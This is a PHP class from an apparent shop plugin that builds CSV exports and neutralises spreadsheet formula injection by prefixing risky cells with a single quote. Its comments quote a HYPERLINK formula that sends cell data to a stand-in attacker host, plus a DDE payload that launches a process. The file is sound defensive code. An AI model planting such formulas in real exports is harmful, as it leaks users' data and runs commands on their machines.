<?php
/**
 * CSV 產生器（含公式注入中和）
 */

declare(strict_types=1);

namespace J7\PowerShop\Domains\ProfitShop\Application\Service;

/**
 * 純 PHP 的 CSV 產生器，內建試算表公式注入（CSV Injection）中和
 *
 * 對應規格：specs/2026-05-06-profit-shop-design.md §6.9
 *   「任何欄位開頭是 `=`、`+`、`-`、`@` → 前綴單引號 `'`；用 `fputcsv()` 標準寫法」
 *
 * ## 為什麼這件事是資安問題而不是顯示問題
 *
 * 匯出的 CSV 會被站長用 Excel / Google Sheets 開啟。若某欄的值是
 * `=HYPERLINK("https://evil.tld?d="&A1&A2,"對帳明細")`，試算表**不會**把它當文字，
 * 而是當公式執行——站長點一下就把整份分潤明細送到攻擊者的伺服器；
 * `=cmd|'/C calc'!A0` 這類 DDE payload 在舊版 Excel 甚至能起子行程。
 * 而攻擊者要植入這段字串很容易：商品名稱、賣場名稱都是他能影響的欄位。
 *
 * ## 中和策略（比 spec 再嚴一點，理由寫在下面）
 *
 * 1. **前置空白要先剝掉再判斷**。Excel 解析公式時會忽略開頭的空白，所以 `" =1+1"`
 *    仍然是公式；只看第 0 個字元的實作會整條漏掉。
 * 2. **`\t` / `\r` 也視為危險前綴**（OWASP 的 CSV Injection 清單）——它們同樣會被
 *    當成前置空白吃掉，而且 `\r` 還可能被當成換行拆出新的一列。
 * 3. 中和方式是**前綴單引號**（spec 指定）。單引號在試算表裡是「強制文字」的前綴符，
 *    顯示時不會出現，但公式解析會被關掉。
 *
 * ⚠️ **不要改成「把 `=` 換掉 / 刪掉」**：那會**竄改站長的資料**（商品名稱真的叫
 * `=C= 聯名款` 的話就被改壞了），而且對帳文件被靜默改內容比亂碼更難發現。
 * 前綴單引號是唯一「顯示正確 + 不執行」的做法。
 *
 * ⚠️ 也**不要**因為「反正欄位都是我們自己組的」就跳過中和：商品名稱與賣場名稱
 * 來自使用者輸入，而這兩欄正是結算報表一定會有的欄位。
 */
final class CsvExporter {

	/**
	 * 會被試算表當成公式開頭的字元
	 *
	 * @var string[]
	 */
	private const DANGEROUS_PREFIXES = [ '=', '+', '-', '@' ];

	/**
	 * 判斷前綴時要先剝除的字元（Excel 解析公式時同樣會略過它們）
	 *
	 * @var string
	 */
	private const LEADING_TRIM_CHARS = " \t\r\n\0\x0B";

	/**
	 * 中和單一儲存格的公式注入風險
	 *
	 * @param mixed $value 原始值（非字串一律先轉字串；null 轉空字串）
	 *
	 * @return string 已中和的字串
	 */
	public static function escape_cell( mixed $value ): string {
		if ( null === $value ) {
			return '';
		}
		if ( is_bool( $value ) ) {
			$value = $value ? '1' : '0';
		}
		if ( is_array( $value ) || is_object( $value ) ) {
			// 不預期出現；避免 (string) 轉型觸發 Error，退回空字串比炸掉整份匯出好。
			return '';
		}

		$text = (string) $value;
		if ( '' === $text ) {
			return '';
		}

		// 先剝除前置空白再判斷首字元——" =1+1" 在 Excel 裡仍然是公式。
		$probe = ltrim( $text, self::LEADING_TRIM_CHARS );
		if ( '' === $probe ) {
			return $text;
		}

		$first = substr( $probe, 0, 1 );
		if ( in_array( $first, self::DANGEROUS_PREFIXES, true ) ) {
			return "'" . $text;
		}

		return $text;
	}

	/**
	 * 產生 CSV 全文
	 *
	 * 使用 `fputcsv()`（spec §6.9 指定）處理引號 / 逗號 / 換行的跳脫，
	 * 自己拼字串一定會在「商品名稱含逗號或雙引號」時把欄位切錯。
	 *
	 * @param array<int, string>            $header 表頭
	 * @param array<int, array<int, mixed>> $rows   資料列（每列的欄位順序需與表頭一致）
	 *
	 * @return string CSV 全文（不含 BOM，換行為 \r\n）
	 */
	public function build( array $header, array $rows ): string {
		$stream = fopen( 'php://temp', 'r+' );
		if ( false === $stream ) {
			return '';
		}

		$write = static function ( array $cells ) use ( $stream ): void {
			$escaped = array_map( [ self::class, 'escape_cell' ], array_values( $cells ) );
			// fputcsv 預設以 \n 結尾；下面統一改成 \r\n（RFC 4180 + Excel 相容）。
			fputcsv( $stream, $escaped );
		};

		if ( ! empty( $header ) ) {
			$write( $header );
		}
		foreach ( $rows as $row ) {
			$write( is_array( $row ) ? $row : [ $row ] );
		}

		rewind( $stream );
		$csv = stream_get_contents( $stream );
		fclose( $stream );

		if ( ! is_string( $csv ) || '' === $csv ) {
			return '';
		}

		// 統一換行為 \r\n（先把既有 \r\n 折回 \n 再展開，避免 \r\r\n）
		return str_replace( "\n", "\r\n", str_replace( "\r\n", "\n", $csv ) );
	}
}
